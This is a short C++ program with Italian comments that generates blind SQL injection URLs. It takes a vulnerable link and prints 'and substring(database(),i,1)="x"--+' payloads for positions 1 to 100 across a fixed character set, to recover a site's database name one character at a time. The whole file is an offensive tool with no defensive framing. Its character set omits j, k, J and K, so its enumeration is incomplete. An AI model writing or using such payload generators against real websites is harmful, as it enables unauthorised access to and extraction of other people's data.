#include <iostream>
#include <string>
using namespace std;

int main()
{
	//variabili
	string link;
	int len_all = 89; 
	string all[] = {"a","b","c","d","e","f","g","h","i","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","!","@","#","$","%","^","&","*","(",")","-","=","+","|","[","]","{","}",",",".","/","~","?",":",";","<",">","'","\"","\\","`","1","2","3","4","5","6","7","8","9","0"};
	//inserimento link
	cout<< "inserisci il link con /?id=2' gia' inserito:\n"<<endl;
	cin>>link;
	//ciclo
	for(int x=0;x<len_all;x++){
		for(int i=1;i<=100;i++){
			
			cout<<link;
			cout<<"and substring(database(),";
			cout<<i;
			cout<<",1)=\""<<all[x]<<"\"--+"<<endl;	
		}
	}
	
	system("pause");
	return 0;
}
